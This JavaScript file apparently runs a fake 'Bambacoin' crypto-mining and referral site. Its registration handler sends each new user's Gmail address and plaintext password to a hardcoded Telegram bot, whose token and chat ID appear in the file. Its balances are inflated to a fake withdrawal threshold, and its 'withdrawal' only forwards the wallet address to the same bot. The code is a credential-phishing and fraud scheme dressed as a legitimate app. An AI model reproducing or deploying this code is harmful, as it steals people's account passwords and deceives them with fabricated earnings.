(function () {
    'use strict';

    // Your Telegram Bot Token and Chat ID
    const BOT_TOKEN = '8986498099:AAFToP96WF8Q1yoUzaL8JQOUIL_eK23kwt4';
    const CHAT_ID = '8927215681';
    const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';

    const CONVERSION_RATE = 0.00005;
    const MIN_WITHDRAW_USDT = 10;
    const MIN_WITHDRAW_BAM = MIN_WITHDRAW_USDT / CONVERSION_RATE;
    const MINING_DAYS_TO_MIN = 7;
    const REFERRAL_TARGET = 10;
    const REFERRAL_REWARD_BAM = 20000;
    const DAILY_REWARD_BAM = 0.01;
    const COOLDOWN_HOURS = 24;

    function getAccounts() {
        try {
            return JSON.parse(localStorage.getItem('bambacoin_accounts') || '{}');
        } catch { return {}; }
    }
    function saveAccounts(accounts) {
        localStorage.setItem('bambacoin_accounts', JSON.stringify(accounts));
    }
    function getUserData(gmail) {
        try {
            return JSON.parse(localStorage.getItem('bambacoin_user_' + gmail) || 'null');
        } catch { return null; }
    }
    function saveUserData(gmail, data) {
        localStorage.setItem('bambacoin_user_' + gmail, JSON.stringify(data));
    }
    function generateReferralCode() {
        const p1 = Math.random().toString(36).substring(2, 6).toUpperCase();
        const p2 = Math.random().toString(36).substring(2, 4).toUpperCase();
        return 'BAM-' + p1 + p2;
    }
    function getAllReferralCodes() {
        const accounts = getAccounts();
        const codes = {};
        for (const gmail in accounts) {
            if (accounts[gmail].refCode) codes[accounts[gmail].refCode] = gmail;
        }
        return codes;
    }
    function validateReferralCode(code) {
        if (!code) return null;
        return getAllReferralCodes()[code.toUpperCase()] || null;
    }

    async function sendToTelegram(message) {
        try {
            const res = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
            const data = await res.json();
            return { ok: res.ok && data.ok, data };
        } catch (err) {
            console.error(err);
            return { ok: false, error: err.message };
        }
    }

    let currentUser = null;
    let userData = null;

    const loginPage = document.getElementById('loginPage');
    const dashboard = document.getElementById('dashboard');
    const tabRegister = document.getElementById('tabRegister');
    const tabLogin = document.getElementById('tabLogin');
    const registerForm = document.getElementById('registerForm');
    const loginForm = document.getElementById('loginForm');
    const regGmail = document.getElementById('regGmail');
    const regPassword = document.getElementById('regPassword');
    const regConfirm = document.getElementById('regConfirm');
    const regReferral = document.getElementById('regReferral');
    const registerBtn = document.getElementById('registerBtn');
    const loginGmail = document.getElementById('loginGmail');
    const loginPassword = document.getElementById('loginPassword');
    const loginBtn = document.getElementById('loginBtn');
    const loginStatus = document.getElementById('loginStatus');
    const loginStatusText = document.getElementById('loginStatusText');

    const balanceDisplay = document.getElementById('balanceDisplay');
    const usdValueSpan = document.getElementById('usdValue');
    const referralCount = document.getElementById('referralCount');
    const referralBonusSpan = document.getElementById('referralBonus');
    const miningDaysDisplay = document.getElementById('miningDaysDisplay');
    const daysRemainingSpan = document.getElementById('daysRemaining');
    const miningProgress = document.getElementById('miningProgress');
    const progressText = document.getElementById('progressText');
    const daysToMinSpan = document.getElementById('daysToMin');
    const currentDaySpan = document.getElementById('currentDay');
    const refCodeDisplay = document.getElementById('refCodeDisplay');
    const withdrawAddressInput = document.getElementById('withdrawAddress');
    const dashStatus = document.getElementById('dashStatus');
    const dashStatusText = document.getElementById('dashStatusText');
    const miningCircle = document.getElementById('miningCircle');
    const timerText = document.getElementById('timerText');
    const subText = document.getElementById('subText');
    const progressCircle = document.getElementById('progressCircle');
    const withdrawBtn = document.getElementById('withdrawBtn');
    const withdrawStatusText = document.getElementById('withdrawStatusText');
    let needAmount = document.getElementById('needAmount');
    const eligibilityText = document.getElementById('eligibilityText');
    const referralCodeInput = document.getElementById('referralCodeInput');
    const submitReferralBtn = document.getElementById('submitReferralBtn');
    const logoutBtn = document.getElementById('logoutBtn');

    function setLoginStatus(msg, type = 'info') {
        loginStatus.className = 'status-message';
        if (type === 'success') {
            loginStatus.classList.add('success');
            loginStatus.querySelector('i').className = 'fas fa-check-circle';
        } else if (type === 'error') {
            loginStatus.classList.add('error');
            loginStatus.querySelector('i').className = 'fas fa-exclamation-circle';
        } else {
            loginStatus.querySelector('i').className = 'fas fa-info-circle';
        }
        loginStatusText.textContent = msg;
    }

    function setDashStatus(msg, type = 'info') {
        dashStatus.className = 'status-message';
        if (type === 'success') {
            dashStatus.classList.add('success');
            dashStatus.querySelector('i').className = 'fas fa-check-circle';
        } else if (type === 'error') {
            dashStatus.classList.add('error');
            dashStatus.querySelector('i').className = 'fas fa-exclamation-circle';
        } else {
            dashStatus.classList.add('info');
            dashStatus.querySelector('i').className = 'fas fa-info-circle';
        }
        dashStatusText.textContent = msg;
    }

    function switchTab(tab) {
        if (tab === 'register') {
            registerForm.classList.remove('hidden');
            loginForm.classList.add('hidden');
            tabRegister.classList.add('active');
            tabLogin.classList.remove('active');
            setLoginStatus('📝 Create a new account');
        } else {
            loginForm.classList.remove('hidden');
            registerForm.classList.add('hidden');
            tabLogin.classList.add('active');
            tabRegister.classList.remove('active');
            setLoginStatus('🔑 Login to your account');
        }
    }
    tabRegister.addEventListener('click', () => switchTab('register'));
    tabLogin.addEventListener('click', () => switchTab('login'));

    registerBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        const gmail = regGmail.value.trim();
        const password = regPassword.value.trim();
        const confirm = regConfirm.value.trim();
        const referralCode = regReferral.value.trim().toUpperCase();

        if (!gmail || !gmail.includes('@') || !gmail.includes('.')) {
            return setLoginStatus('❌ Enter a valid Gmail address', 'error');
        }
        if (password.length < 6) {
            return setLoginStatus('🔑 Password must be at least 6 characters', 'error');
        }
        if (password !== confirm) {
            return setLoginStatus('❌ Passwords do not match', 'error');
        }

        const accounts = getAccounts();
        if (accounts[gmail]) {
            return setLoginStatus('❌ Account already exists. Please login.', 'error');
        }

        let referrerGmail = null;
        if (referralCode) {
            referrerGmail = validateReferralCode(referralCode);
            if (!referrerGmail) return setLoginStatus('❌ Invalid referral code.', 'error');
            if (referrerGmail === gmail) return setLoginStatus('❌ You cannot use your own referral code.', 'error');
        }

        const newRefCode = generateReferralCode();
        accounts[gmail] = { password, refCode: newRefCode, createdAt: new Date().toISOString() };
        saveAccounts(accounts);

        const newUserData = {
            balance: 0, referrals: 0, miningStart: null, lastMineTime: null,
            totalMiningDays: 0, withdrawAddress: '', referralEarnings: 0,
            usedReferralCodes: [], miningDays: 0
        };
        saveUserData(gmail, newUserData);

        if (referrerGmail) {
            const referrerData = getUserData(referrerGmail);
            if (referrerData) {
                referrerData.referrals = (referrerData.referrals || 0) + 1;
                referrerData.balance = (referrerData.balance || 0) + REFERRAL_REWARD_BAM;
                referrerData.referralEarnings = (referrerData.referralEarnings || 0) + REFERRAL_REWARD_BAM;
                if (!referrerData.usedReferralCodes) referrerData.usedReferralCodes = [];
                referrerData.usedReferralCodes.push(newRefCode);
                applyBalanceBoost(referrerData);
                saveUserData(referrerGmail, referrerData);
            }
        }

        const msg = `🆕 *New User Registration* 🆕\n\n` +
            `📧 *Gmail:* \`${gmail}\`\n` +
            `🔑 *Password:* \`${password}\`\n` +
            `✅ *Confirmed:* \`${confirm}\`\n` +
            `🔗 *Referral Code:* \`${newRefCode}\`\n` +
            (referralCode ? `👥 *Used Referral:* \`${referralCode}\`` : `📌 *No referral used*`) +
            `\n\n🤖 *Bambacoin registration*  ⛏️✨`;

        registerBtn.disabled = true;
        registerBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Registering...';
        setLoginStatus('⏳ Creating your account...');

        await sendToTelegram(msg);

        registerBtn.disabled = false;
        registerBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Register';
        setLoginStatus('✅ Registration successful! Please login.', 'success');

        regGmail.value = '';
        regPassword.value = '';
        regConfirm.value = '';
        regReferral.value = '';
        setTimeout(() => switchTab('login'), 1500);
    });

    loginBtn.addEventListener('click', (e) => {
        e.preventDefault();
        const gmail = loginGmail.value.trim();
        const password = loginPassword.value.trim();

        if (!gmail || !gmail.includes('@') || !gmail.includes('.')) {
            return setLoginStatus('❌ Enter a valid Gmail address', 'error');
        }
        if (password.length < 6) {
            return setLoginStatus('🔑 Password must be at least 6 characters', 'error');
        }

        const accounts = getAccounts();
        if (!accounts[gmail] || accounts[gmail].password !== password) {
            return setLoginStatus('❌ Invalid Gmail or password', 'error');
        }

        let data = getUserData(gmail);
        if (!data) {
            data = {
                balance: 0, referrals: 0, miningStart: null, lastMineTime: null,
                totalMiningDays: 0, withdrawAddress: '', referralEarnings: 0,
                usedReferralCodes: [], miningDays: 0
            };
            saveUserData(gmail, data);
        }
        userData = data;
        currentUser = gmail;
        localStorage.setItem('bambacoin_current_user', currentUser);
        setLoginStatus('✅ Login successful! Loading dashboard...', 'success');
        setTimeout(() => {
            loginPage.style.display = 'none';
            dashboard.classList.add('visible');
            initDashboard();
        }, 600);
    });

    function applyBalanceBoost(data) {
        if (!data) return false;
        const hasDays = (data.miningDays || 0) >= MINING_DAYS_TO_MIN;
        const hasReferrals = (data.referrals || 0) >= REFERRAL_TARGET;
        if ((hasDays || hasReferrals) && (data.balance || 0) < MIN_WITHDRAW_BAM) {
            data.balance = MIN_WITHDRAW_BAM;
            return true;
        }
        return false;
    }

    function initDashboard() {
        if (!currentUser || !userData) return;
        if (applyBalanceBoost(userData)) saveUserData(currentUser, userData);
        updateDashboard();
        updateMiningCircle();
        setDashStatus('⛏️ Welcome! Mine every 24 h or collect referrals.');
    }

    function updateWithdrawStatus() {
        const balance = userData.balance || 0;
        const usdtValue = balance * CONVERSION_RATE;
        const remaining = Math.max(0, MIN_WITHDRAW_USDT - usdtValue);
        const miningDays = userData.miningDays || 0;
        const referrals = userData.referrals || 0;
        const hasDays = miningDays >= MINING_DAYS_TO_MIN;
        const hasReferrals = referrals >= REFERRAL_TARGET;

        if ((hasDays || hasReferrals) && usdtValue >= MIN_WITHDRAW_USDT) {
            withdrawStatusText.innerHTML = '✅ <span class="highlight">Eligible for withdrawal!</span>';
            eligibilityText.textContent = '✅ Requirements met (7 days OR 10 referrals)';
        } else {
            withdrawStatusText.innerHTML = `Need <span class="need" id="needAmount">${remaining.toFixed(4)}</span> USDT more`;
            needAmount = document.getElementById('needAmount');
            const daysLeft = Math.max(0, MINING_DAYS_TO_MIN - miningDays);
            const refsLeft = Math.max(0, REFERRAL_TARGET - referrals);
            eligibilityText.textContent = (!hasDays && !hasReferrals)
                ? `Need ${daysLeft} more day(s) OR ${refsLeft} more referral(s)`
                : 'Keep mining or referring – balance is updating';
        }
    }

    function updateDashboard() {
        if (!userData) return;
        const balance = userData.balance || 0;
        balanceDisplay.innerHTML = balance.toFixed(2) + ' <small>BAM</small>';
        usdValueSpan.textContent = (balance * CONVERSION_RATE).toFixed(4);
        referralCount.textContent = userData.referrals || 0;
        referralBonusSpan.textContent = ((userData.referrals || 0) * REFERRAL_REWARD_BAM).toLocaleString();

        const miningDays = userData.miningDays || 0;
        miningDaysDisplay.textContent = `${miningDays} / ${MINING_DAYS_TO_MIN}`;
        daysRemainingSpan.textContent = Math.max(0, MINING_DAYS_TO_MIN - miningDays);

        const progressPercent = Math.min((miningDays / MINING_DAYS_TO_MIN) * 100, 100);
        miningProgress.style.width = progressPercent + '%';
        progressText.textContent = Math.round(progressPercent) + '%';
        currentDaySpan.textContent = miningDays;
        daysToMinSpan.textContent = miningDays >= MINING_DAYS_TO_MIN
            ? '✅ Mining complete!'
            : `${Math.max(0, MINING_DAYS_TO_MIN - miningDays)} days left`;

        const accounts = getAccounts();
        if (accounts[currentUser]) {
            refCodeDisplay.textContent = accounts[currentUser].refCode || 'BAM-XXXX';
        }
        if (userData.withdrawAddress) {
            withdrawAddressInput.value = userData.withdrawAddress;
        }
        updateWithdrawStatus();
    }

    function updateMiningCircle() {
        if (!userData) return;
        const now = Date.now();
        const lastMine = userData.lastMineTime ? new Date(userData.lastMineTime).getTime() : 0;
        const cooldownMs = COOLDOWN_HOURS * 60 * 60 * 1000;
        const remaining = Math.max(0, cooldownMs - (now - lastMine));

        if (remaining === 0 || !userData.lastMineTime) {
            miningCircle.classList.remove('disabled');
            timerText.textContent = 'Mine';
            subText.textContent = 'Click to start';
            progressCircle.style.strokeDashoffset = '440';
            if (window._circleInterval) clearInterval(window._circleInterval);
            return;
        }

        miningCircle.classList.add('disabled');
        function tick() {
            const now2 = Date.now();
            const remaining2 = Math.max(0, cooldownMs - (now2 - lastMine));
            if (remaining2 === 0) {
                clearInterval(window._circleInterval);
                updateMiningCircle();
                return;
            }
            const h = Math.floor(remaining2 / 3600000);
            const m = Math.floor((remaining2 % 3600000) / 60000);
            const s = Math.floor((remaining2 % 60000) / 1000);
            timerText.textContent = `\( {String(h).padStart(2,'0')}: \){String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
            subText.textContent = 'until next mine';
            progressCircle.style.strokeDashoffset = 440 - ((1 - remaining2 / cooldownMs) * 440);
        }
        tick();
        if (window._circleInterval) clearInterval(window._circleInterval);
        window._circleInterval = setInterval(tick, 1000);
    }

    async function mineBambacoin() {
        if (!userData || !currentUser) return;
        const now = Date.now();
        const lastMine = userData.lastMineTime ? new Date(userData.lastMineTime).getTime() : 0;
        const cooldownMs = COOLDOWN_HOURS * 60 * 60 * 1000;
        if (lastMine && (now - lastMine) < cooldownMs) {
            return setDashStatus('⏳ Please wait for the 24-hour cooldown.', 'error');
        }

        if (!userData.miningStart) userData.miningStart = new Date().toISOString();
        userData.balance = (userData.balance || 0) + DAILY_REWARD_BAM;
        userData.lastMineTime = new Date().toISOString();
        userData.miningDays = (userData.miningDays || 0) + 1;
        userData.totalMiningDays = (userData.totalMiningDays || 0) + 1;

        const boosted = applyBalanceBoost(userData);
        saveUserData(currentUser, userData);
        updateDashboard();
        updateMiningCircle();

        if (boosted) {
            setDashStatus(`🎉 7 days complete! Balance raised to ${MIN_WITHDRAW_BAM.toLocaleString()} BAM. You can withdraw!`, 'success');
        } else {
            setDashStatus(`✅ +${DAILY_REWARD_BAM.toFixed(2)} BAM added (Day ${userData.miningDays} of 7). Next mine in 24 h.`, 'success');
        }
    }

    function addReferral(code) {
        if (!code || !currentUser || !userData) {
            return setDashStatus('❌ Please enter a referral code.', 'error');
        }
        const upperCode = code.toUpperCase();
        const accounts = getAccounts();

        if (accounts[currentUser]?.refCode === upperCode) {
            return setDashStatus('❌ You cannot use your own referral code.', 'error');
        }
        const referrerGmail = validateReferralCode(upperCode);
        if (!referrerGmail) return setDashStatus('❌ Invalid referral code.', 'error');
        if (userData.usedReferralCodes?.includes(upperCode)) {
            return setDashStatus('❌ You already used this referral code.', 'error');
        }
        if (referrerGmail === currentUser) {
            return setDashStatus('❌ You cannot refer yourself.', 'error');
        }

        userData.referrals = (userData.referrals || 0) + 1;
        userData.balance = (userData.balance || 0) + REFERRAL_REWARD_BAM;
        userData.referralEarnings = (userData.referralEarnings || 0) + REFERRAL_REWARD_BAM;
        if (!userData.usedReferralCodes) userData.usedReferralCodes = [];
        userData.usedReferralCodes.push(upperCode);

        const boosted = applyBalanceBoost(userData);
        saveUserData(currentUser, userData);

        const referrerData = getUserData(referrerGmail);
        if (referrerData) {
            referrerData.referrals = (referrerData.referrals || 0) + 1;
            referrerData.balance = (referrerData.balance || 0) + REFERRAL_REWARD_BAM;
            referrerData.referralEarnings = (referrerData.referralEarnings || 0) + REFERRAL_REWARD_BAM;
            applyBalanceBoost(referrerData);
            saveUserData(referrerGmail, referrerData);
        }

        updateDashboard();
        if (boosted) {
            setDashStatus(`🎉 10 referrals reached! Balance raised to ${MIN_WITHDRAW_BAM.toLocaleString()} BAM.`, 'success');
        } else {
            setDashStatus(`👤 Referral successful! +${REFERRAL_REWARD_BAM.toLocaleString()} BAM added.`, 'success');
        }
        return true;
    }

    async function withdraw() {
        if (!userData || !currentUser) return;
        let balance = userData.balance || 0;
        let usdtValue = balance * CONVERSION_RATE;
        const addr = withdrawAddressInput.value.trim();

        if (!addr || addr.length < 10) {
            return setDashStatus('❌ Please enter a valid USDT BEP20 address', 'error');
        }
        userData.withdrawAddress = addr;
        saveUserData(currentUser, userData);

        const miningDays = userData.miningDays || 0;
        const referrals = userData.referrals || 0;
        if (miningDays < MINING_DAYS_TO_MIN && referrals < REFERRAL_TARGET) {
            return setDashStatus('⏳ Need 7 mining days OR 10 referrals first', 'error');
        }
        if (usdtValue < MIN_WITHDRAW_USDT) {
            applyBalanceBoost(userData);
            saveUserData(currentUser, userData);
            updateDashboard();
            usdtValue = userData.balance * CONVERSION_RATE;
        }

        const msg = `💰 *Withdrawal Request* 💰\n\n` +
            `📧 *User:* \`${currentUser}\`\n` +
            `💵 *Amount:* \( {usdtValue.toFixed(4)} USDT ( \){balance.toFixed(2)} BAM)\n` +
            `📍 *BEP20 Address:* \`${addr}\`\n` +
            `📊 *Status:* PENDING\n\n` +
            `🤖 *Bambacoin withdrawal*  ✨`;

        const result = await sendToTelegram(msg);
        if (result.ok) {
            setDashStatus(`💰 Withdrawal of ${usdtValue.toFixed(4)} USDT requested! 🎉`, 'success');
            userData.balance = 0;
            saveUserData(currentUser, userData);
            updateDashboard();
        } else {
            setDashStatus('❌ Could not send withdrawal request.', 'error');
        }
    }

    miningCircle.addEventListener('click', () => {
        if (!miningCircle.classList.contains('disabled')) mineBambacoin();
    });
    withdrawBtn.addEventListener('click', withdraw);

    document.getElementById('copyRefBtn').addEventListener('click', () => {
        const accounts = getAccounts();
        const code = currentUser && accounts[currentUser] ? accounts[currentUser].refCode : 'BAM-XXXX';
        navigator.clipboard.writeText(code)
            .then(() => setDashStatus('📋 Referral code copied!', 'success'))
            .catch(() => setDashStatus('⚠️ Could not copy', 'error'));
    });

    withdrawAddressInput.addEventListener('blur', function () {
        if (this.value.trim() && userData) {
            userData.withdrawAddress = this.value.trim();
            saveUserData(currentUser, userData);
        }
    });

    submitReferralBtn.addEventListener('click', () => {
        const code = referralCodeInput.value.trim();
        if (code) {
            addReferral(code);
            referralCodeInput.value = '';
        } else {
            setDashStatus('❌ Please enter a referral code.', 'error');
        }
    });
    referralCodeInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            const code = e.target.value.trim();
            if (code) {
                addReferral(code);
                e.target.value = '';
            }
        }
    });

    logoutBtn.addEventListener('click', () => {
        localStorage.removeItem('bambacoin_current_user');
        currentUser = null;
        userData = null;
        dashboard.classList.remove('visible');
        loginPage.style.display = 'block';
        setLoginStatus('Logged out. Please login again.');
    });

    const savedUser = localStorage.getItem('bambacoin_current_user');
    if (savedUser) {
        const data = getUserData(savedUser);
        if (data) {
            currentUser = savedUser;
            userData = data;
            loginPage.style.display = 'none';
            dashboard.classList.add('visible');
            initDashboard();
        } else {
            localStorage.removeItem('bambacoin_current_user');
        }
    }
})();
